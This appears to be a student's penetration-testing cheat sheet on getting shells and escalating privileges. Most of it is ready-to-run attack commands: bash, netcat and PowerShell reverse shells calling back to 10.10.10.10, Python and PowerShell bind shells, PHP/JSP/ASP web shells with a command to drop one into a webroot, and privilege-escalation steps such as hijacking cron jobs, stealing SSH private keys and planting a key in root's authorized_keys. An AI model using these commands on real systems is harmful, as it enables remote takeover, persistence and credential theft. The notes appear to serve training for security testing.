I) Type of shells: - Bash (linux) or Powershell (Windows)

    To connect to a shell:
    - SSH for limux or WinRM for Windows


    We could connect to a remote host througj:
    - Reverse shell: connects back to our system and gives us control through reverse connection
    - Bind shell: Waits for us to connect to it and gives us control once we do
    - Web shell: Communicates through a web server, pass command directly on web and get the response



    a) Reverse shell:

Most common type of shell, quickest and easiest method to obtain control over compromised host.
we can use netcat :
=> nc -lvnp(Listen Verbose N(disable DNS resolution) Port) 4444

Find our own ip: ip a ; ipconfig; ifconfig

    reverse shell command:

=> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

=> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

=> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

    b) Bind shell

Here we have to connect to the targets through a listening port

=> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

=> python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

=> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

Once we execute the bind shell command, we should have a shell waiting for us on the specified
port, then we can connect to it.

=> nc <IP> <PORT>

Upgrading TTY(shell for more command)
=> python -c 'import pty; pty.spawn("/bin/bash")'
=> ctrl+z (to background the shell and back on the local terminal)
=> ssty raw -echo
=> fg

Sometimes the shell doesnt fit all the terminal, to fix this we can run:
=> echo $TERM=xterm-256color
=> ssty rows 67 columns 318

    c) Web Shell

=> <?php system($_REQUEST["cmd"]); ?>

=> <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

=> <% eval request("cmd") %>

Uploading the web shell: - need to be uploaded in the webroot - can be through a vulnerability for uploading file

webroot for - Apache : /var/www/html - Nginx : /usr/local/nginx/html/ - IIS : c:\inetpub\wwwroot\

- XAMPP : c:\xampp\htdocs\

For example if we attack a linux host we could do:
=> echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php








II) Privilege Escalation

Goal is to be root (linux) or administrator/SYSTEM (windows)

    a) PriEsc Checklists

- Linux Hacktricks: https://hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
- Windows Hacktricks: https://hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html

- Linux PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Windows PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

      b) Enumeration scripts

  There is automated tools that could do all these checklists:

- linux:
  - linEnum: https://github.com/rebootuser/LinEnum
  - linuxprichecker: https://github.com/sleventyeleven/linuxprivchecker

- windows:
  - seatbelt: https://github.com/GhostPack/Seatbelt
  - jaws: https://github.com/411Hall/JAWS

Both: PEASS: https://github.com/peass-ng/PEASS-ng

Furthermore we could look for: 
    - outdated kernel/OS - Vulnerable software (dpkg -l in linux)/ (C:\Program Files in windows) 
    - User Privileges (Sudo in linux) / (SUID in windows) / Windows Token Privileges

view our priviledges: sudo -l
Switch to root: sudo su -

List of command that could be exploited with Sudo: https://gtfobins.org/

    c) Scheduled task

We can add new cron/tasks jobs or trick them to excecute malware
if we have write permission in one of the following directories: - /etc/crontab - /etc/cron.d - /var/spool/cron/crontabs/root

if we can write to a directory called by a cron job, we can write a bash script
with a reverse shell command, which should send us a reverse shell when executed.

    d) Exposed credentials

It could be found in configurations files, log files or user history(bash_history for linux and PSReadLine in Windows)

    e) SSH Keys

We may have read access over a .ssh directory and may found - home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server.

If we have a read access via the id_rsa ; we may copy it to our machne and use -i to log with it: 
    - vim id_rsa (or cat)
    - chmod 600 id_rsa 
    - ssh root@IP -i id_rsa

If we have write access in another user /.ssh directory, we can place our public key in the : - /home/user/.ssh/authorized_keys

To create our ssh key : - ssh-keygen -f key (-f specify the output file)

Once generated we copy it: - echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

Then to connect we can do : ssh root@10.10.10.10 -i key


Find something globally: find / -type d -name ".ssh" 2>/dev/null

